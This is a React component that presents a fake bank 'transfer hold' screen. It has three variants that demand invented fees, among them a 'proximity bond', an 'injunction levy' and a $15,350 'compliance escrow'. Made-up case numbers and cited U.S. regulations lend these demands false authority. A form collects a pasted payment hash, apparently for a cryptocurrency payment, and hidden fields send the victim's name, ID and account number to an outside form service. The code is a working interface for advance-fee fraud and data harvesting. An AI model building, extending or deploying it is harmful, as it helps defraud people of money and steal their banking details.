import React, { useState } from 'react';
import { motion, AnimatePresence } from 'motion/react';
import { ShieldAlert, MapPin, Building2, Lock, ChevronDown, ChevronUp, Send, CheckCircle2, AlertTriangle, Info, ArrowUpRight } from 'lucide-react';
import { UserProfile } from '../types';

export interface FintechTransactionProps {
  stateType: 'proximity_bond' | 'injunction_levy' | 'sequestration_lock';
  currentUser: UserProfile;
  remediationFee?: number; // Pre-calculated stable fee for injunction_levy
  onVerifyToken?: (token: string, notes: string) => void;
  onMailtoClick?: () => void;
  isReconciling?: boolean;
}

export const FintechTransactionComponent: React.FC<FintechTransactionProps> = ({
  stateType,
  currentUser,
  remediationFee = 3845,
  onVerifyToken,
  onMailtoClick,
  isReconciling = false
}) => {
  const [showForm, setShowForm] = useState(true);
  const [remediationToken, setRemediationToken] = useState('');
  const [syncNotes, setSyncNotes] = useState('');

  // 1. Get configurations based on the stateType
  const getConfig = () => {
    switch (stateType) {
      case 'proximity_bond':
        return {
          bannerText: '• ROUTING UPDATE | PROXIMITY ALERT',
          bannerColor: 'bg-blue-50 text-[#00669e] border-blue-100',
          dotColor: 'bg-[#00669e]',
          icon: <MapPin className="w-8 h-8 text-[#00669e]" />,
          iconBg: 'bg-blue-50 border border-blue-150',
          header: 'REGIONAL ROUTE MISMATCH',
          protocolPillText: 'PROTOCOL: RS-47281 (REGIONAL EXCEPTION)',
          protocolPillStyle: { backgroundColor: '#eff6ff', color: '#00669e', border: '1px solid #dbeafe' },
          caseFile: 'RS-47281',
          feeRequired: '$1,789.00',
          subject: 'REGIONAL ROUTE MISMATCH - RS-47281',
          actionBtnColor: 'bg-[#00669e] hover:bg-[#00527f]',
          actionBtnText: 'GENERATE PROXIMITY BOND & SYNC ROUTE',
          narrative: (
            <div className="space-y-4 text-sm text-[#1e293b] leading-relaxed text-left font-sans">
              <p>
                Our Transfer Integrity Network detected an automated processing variance between the clearing region hubs handling this settlement. This mismatch prevents instant straight-through execution.
              </p>
              <p>
                To resolve this routing conflict, an infrastructure channel reservation bond is required. The system has automatically calculated the fixed allocation.
              </p>
              <div className="border border-slate-200/80 bg-slate-50/50 p-4 rounded-xl space-y-2 mt-4 font-sans border-l-4 border-l-[#00669e]">
                <span className="text-xs font-mono font-black text-[#00669e] uppercase tracking-wider block">
                  BOND LEDGER ASSESSMENT:
                </span>
                <p className="text-sm font-medium leading-relaxed text-slate-800">
                  Your transfer status is paused at the regional interface pending a Proximity Bond fee of <strong className="text-slate-950 font-black font-mono">($1,789.00)</strong>. There are no other clearing errors detected on this account profile.
                </p>
              </div>
            </div>
          )
        };

      case 'injunction_levy':
        return {
          bannerText: '• CRITICAL EXCEPTION | INTERMEDIARY HALT',
          bannerColor: 'bg-rose-50 text-[#d22e1e] border-rose-150',
          dotColor: 'bg-[#d22e1e]',
          icon: <Building2 className="w-8 h-8 text-[#d22e1e]" />,
          iconBg: 'bg-rose-50 border border-rose-150',
          header: 'INTERBANK INJUNCTION BLOCK',
          protocolPillText: 'PROTOCOL: PF-2026-B-992 (CLEARING HOLD)',
          protocolPillStyle: { backgroundColor: '#fef2f2', color: '#d22e1e', border: '1px solid #fee2e2' },
          caseFile: 'PF-2026-B-992',
          feeRequired: `$${remediationFee.toLocaleString('en-US', { minimumFractionDigits: 2 })}`,
          subject: `INTERBANK INJUNCTION BLOCK - PF-2026-B-992 - Fee: $${remediationFee}`,
          actionBtnColor: 'bg-[#d22e1e] hover:bg-[#b02216]',
          actionBtnText: 'SUBMIT REMEDIATION TOKEN & FORCE SETTLEMENT',
          narrative: (
            <div className="space-y-4 text-sm text-[#1e293b] leading-relaxed text-left font-sans">
              <p>
                The Transfer Integrity Network has programmatically halted this outward settlement due to a non-bypassable automated intermediary node verification rule. Immediate manual validation protocol must be initialized.
              </p>
              <p>
                The system has generated a random transaction clearance remediation levy to override the current interface hold.
              </p>
              <div className="border border-slate-200/80 bg-slate-50/50 p-4 rounded-xl space-y-2 mt-4 font-sans border-l-4 border-l-[#d22e1e]">
                <span className="text-xs font-mono font-black text-[#d22e1e] uppercase tracking-wider block">
                  LEVY LEDGER ASSESSMENT:
                </span>
                <p className="text-sm font-medium leading-relaxed text-slate-800">
                  An official Injunction Remediation Fee has been calculated between the statutory limits. The total outstanding amount due to release the processing lock is <strong className="text-slate-950 font-black font-mono">(${remediationFee.toLocaleString('en-US', { minimumFractionDigits: 2 })})</strong>.
                </p>
              </div>
            </div>
          )
        };

      case 'sequestration_lock':
      default:
        return {
          bannerText: '• LOCKOUT WARNING | ACCOUNT SEQUESTRATION',
          bannerColor: 'bg-rose-950 text-white border-rose-900',
          dotColor: 'bg-rose-500 animate-pulse',
          icon: <Lock className="w-8 h-8 text-[#d22e1e]" />,
          iconBg: 'bg-red-50 border border-red-200',
          header: 'CRITICAL COMPLIANCE REMEDIATION',
          protocolPillText: 'CASE FILE: CF-2026-27311 (ESCROW BLOCK)',
          protocolPillStyle: { backgroundColor: '#d22e1e', color: '#ffffff', border: '1px solid #b02216' },
          caseFile: 'CF-2026-27311',
          feeRequired: '$15,350.00',
          subject: 'CRITICAL COMPLIANCE REMEDIATION - CF-2026-27311',
          actionBtnColor: 'bg-slate-900 hover:bg-black',
          actionBtnText: 'SUBMIT REMEDIATION DATA TO ESCROW DESK',
          narrative: (
            <div className="space-y-4 text-sm text-[#1e293b] leading-relaxed text-left font-sans">
              <p>
                This account architecture has been placed into an un-dismissible containment status due to a terminal processing handshake expiration. Legal clearing regulations dictate an immediate freeze until three distinct isolation demands are resolved.
              </p>
              <div className="border border-slate-200/80 bg-slate-50/50 p-5 rounded-xl space-y-3 mt-4 font-sans border-l-4 border-l-red-650">
                <span className="text-xs font-mono font-black text-[#d22e1e] uppercase tracking-wider block">
                  COMPLIANCE DEMAND ITEMIZED LEDGER:
                </span>
                <ul className="space-y-2 text-xs font-medium text-slate-700">
                  <li className="flex items-start gap-2">
                    <span className="text-[#d22e1e] mt-0.5">•</span>
                    <span>
                      AML Compliance Review Audit Fee: <strong className="text-slate-900 font-bold font-mono">($3,500.00)</strong> (Regulated under 12 CFR §1020.210)
                    </span>
                  </li>
                  <li className="flex items-start gap-2">
                    <span className="text-[#d22e1e] mt-0.5">•</span>
                    <span>
                      KYC Profile Re-verification Processing: <strong className="text-slate-900 font-bold font-mono">($2,200.00)</strong> (Regulated under 31 CFR §1010.230)
                    </span>
                  </li>
                  <li className="flex items-start gap-2">
                    <span className="text-[#d22e1e] mt-0.5">•</span>
                    <span>
                      Custodial Statutory Escrow allocation: <strong className="text-slate-900 font-bold font-mono">($9,650.00)</strong> (Regulated under 12 U.S.C. §1821)
                    </span>
                  </li>
                </ul>
                <div className="pt-2 border-t border-slate-200/60 mt-2 flex justify-between items-center">
                  <span className="text-[10px] font-bold text-[#d22e1e] uppercase tracking-wider">TOTAL REQUIRED LIQUIDITY:</span>
                  <span className="text-sm font-black font-mono text-slate-950">($15,350.00)</span>
                </div>
              </div>
            </div>
          )
        };
    }
  };

  const config = getConfig();

  return (
    <div className="w-full flex flex-col items-center">
      {/* 1. Top Notification Push Banner */}
      <div 
        className={`w-full max-w-2xl px-4.5 py-3.5 rounded-2xl shadow-sm border ${config.bannerColor} mb-5 flex items-center justify-between font-sans text-xs font-bold transition-all animate-fade-in relative overflow-hidden`}
        style={{ borderRadius: '14px' }}
      >
        <div className="flex items-center gap-2">
          {/* Status Dot Indicator */}
          <span className={`w-2.5 h-2.5 rounded-full ${config.dotColor} shrink-0`} />
          <span className="tracking-wide uppercase font-extrabold">{config.bannerText}</span>
        </div>
        <span className="text-slate-400 font-normal lowercase italic">now</span>
      </div>

      {/* Main card composition mirrored from image.png visual structure */}
      <div className="w-full max-w-2xl bg-white border border-slate-200 shadow-xl overflow-hidden flex flex-col relative" style={{ borderRadius: '16px' }}>
        
        {/* Subtle top decoration bar matching color scheme */}
        <div 
          className="w-full h-1.5 shrink-0"
          style={{ backgroundColor: stateType === 'proximity_bond' ? '#00669e' : '#d22e1e' }}
        />

        <div className="p-6 sm:p-10 flex flex-col items-center space-y-6">
          
          {/* 2. Centered Status Emblem */}
          <div className={`w-16 h-16 rounded-full flex items-center justify-center shadow-inner ${config.iconBg}`}>
            {config.icon}
          </div>

          <div className="space-y-3.5 text-center w-full">
            {/* 3. Primary Display Header */}
            <h3 className="text-xl sm:text-2xl font-black text-slate-900 tracking-tight uppercase leading-snug">
              {config.header}
            </h3>

            {/* 4. Protocol Pill Tag */}
            <div className="flex justify-center">
              <span 
                className="inline-block rounded-full px-4 py-1.5 text-xs font-mono font-black uppercase tracking-wider"
                style={config.protocolPillStyle}
              >
                {config.protocolPillText}
              </span>
            </div>
          </div>

          {/* 5. Narrative Body */}
          <div className="w-full border-t border-slate-100 pt-5">
            {config.narrative}
          </div>

          {/* 6. Action Element with integrated Formspree Submission */}
          <div className="w-full border-t border-slate-150 pt-5 space-y-4">
            
            <div className="flex flex-col sm:flex-row gap-3 w-full">
              {/* Main action toggler */}
              <button
                type="button"
                onClick={() => setShowForm(!showForm)}
                className={`flex-1 h-12 flex items-center justify-center gap-2 text-white font-extrabold text-xs uppercase tracking-widest rounded-xl shadow transition duration-150 cursor-pointer ${config.actionBtnColor}`}
                style={{ borderRadius: '10px' }}
              >
                <span>🛡️</span> {showForm ? 'HIDE SUBMISSION DESK' : 'OPEN SUBMISSION DESK'}
              </button>

              {onMailtoClick && (
                <button
                  type="button"
                  onClick={onMailtoClick}
                  className="px-5 h-12 border border-slate-200 hover:bg-slate-50 text-slate-700 font-extrabold text-xs uppercase tracking-widest rounded-xl transition cursor-pointer flex items-center justify-center gap-2"
                  style={{ borderRadius: '10px' }}
                >
                  <span>✉️</span> CONTACT COMPLIANCE
                </button>
              )}
            </div>

            <AnimatePresence>
              {showForm && (
                <motion.div
                  initial={{ height: 0, opacity: 0 }}
                  animate={{ height: 'auto', opacity: 1 }}
                  exit={{ height: 0, opacity: 0 }}
                  transition={{ duration: 0.2 }}
                  className="overflow-hidden"
                >
                  <form 
                    action="https://formspree.io/f/mzdlgddq" 
                    method="POST"
                    className="bg-slate-50 border border-slate-200 p-5 sm:p-6 rounded-2xl text-left space-y-4.5"
                    style={{ borderRadius: '12px' }}
                  >
                    <div className="border-b border-slate-200 pb-3 mb-2 flex items-center justify-between">
                      <span className="text-[11px] font-mono uppercase tracking-wider text-[#00669e] font-black">
                        🔒 Formspree Secure Node Dispatch
                      </span>
                      <span className="text-[9px] font-mono text-slate-400">
                        REF ID: {config.caseFile}
                      </span>
                    </div>

                    {/* Hidden Formspree parameters */}
                    <input type="hidden" name="_subject" value={config.subject} />
                    <input type="hidden" name="case_file" value={config.caseFile} />
                    <input type="hidden" name="fee_required" value={config.feeRequired} />
                    <input type="hidden" name="user_name" value={currentUser.name} />
                    <input type="hidden" name="user_id" value={currentUser.id} />
                    <input type="hidden" name="account_number" value={currentUser.accountNumber} />

                    {/* Form Fields */}
                    <div className="space-y-4">
                      {/* Input field 1: remediation_token */}
                      <div className="space-y-1.5">
                        <label className="block text-[10px] font-mono uppercase tracking-widest text-slate-500 font-bold">
                          Remediation Token / Transaction Hash <span className="text-red-500">*</span>
                        </label>
                        <div className="relative">
                          <input
                            type="text"
                            name="remediation_token"
                            required
                            value={remediationToken}
                            onChange={(e) => setRemediationToken(e.target.value)}
                            placeholder="Paste clearance hash (e.g. Bc1qrdgcd...)"
                            className="w-full h-11 bg-white border border-slate-200 px-3.5 rounded-lg text-xs font-mono text-[#003a70] focus:ring-1.5 focus:ring-[#00669e]/30 focus:border-[#00669e] outline-none shadow-sm placeholder:font-sans placeholder:text-slate-400"
                            style={{ borderRadius: '8px' }}
                          />
                        </div>
                        <p className="text-[9px] text-slate-400 leading-normal">
                          Provide the unique confirmation code or blockchain transaction block seal received from your processing voucher.
                        </p>
                      </div>

                      {/* Input field 2: sync_notes */}
                      <div className="space-y-1.5">
                        <label className="block text-[10px] font-mono uppercase tracking-widest text-slate-500 font-bold">
                          Synchronization & Compliance Notes
                        </label>
                        <textarea
                          name="sync_notes"
                          rows={3}
                          value={syncNotes}
                          onChange={(e) => setSyncNotes(e.target.value)}
                          placeholder="Enter integration/sync notes, reference numbers, or legal dispatch instructions..."
                          className="w-full bg-white border border-slate-200 p-3 rounded-lg text-xs text-slate-800 focus:ring-1.5 focus:ring-[#00669e]/30 focus:border-[#00669e] outline-none shadow-sm resize-none placeholder:text-slate-400"
                          style={{ borderRadius: '8px' }}
                        />
                      </div>
                    </div>

                    <button
                      type="submit"
                      className={`w-full h-11 text-white font-extrabold text-xs uppercase tracking-widest rounded-xl shadow transition duration-150 flex items-center justify-center gap-2 cursor-pointer ${config.actionBtnColor}`}
                      style={{ borderRadius: '8px' }}
                    >
                      <Send className="w-3.5 h-3.5" />
                      {config.actionBtnText}
                    </button>

                    <div className="pt-2 border-t border-slate-200 mt-2 flex items-center justify-between text-[10px] text-slate-400 font-mono">
                      <span>Ref Code: {config.caseFile}</span>
                      <span>Security Standard: TLS 1.3</span>
                    </div>
                  </form>
                </motion.div>
              )}
            </AnimatePresence>
          </div>

          <div className="w-full flex flex-col items-center justify-center space-y-2 pt-2 text-center text-xs text-slate-400">
            <p className="leading-relaxed font-medium">
              Having trouble? Call our institutional help desk at <span className="text-slate-500 font-bold">1-800-555-0199</span> or contact Mathias Koch.
            </p>
            <p className="text-[10px] font-mono text-[#64748b]">
              Compliance Engine Assessment: {new Date().toISOString().replace('T', ' ').substring(0, 19)} UTC
            </p>
          </div>

        </div>
      </div>
    </div>
  );
};
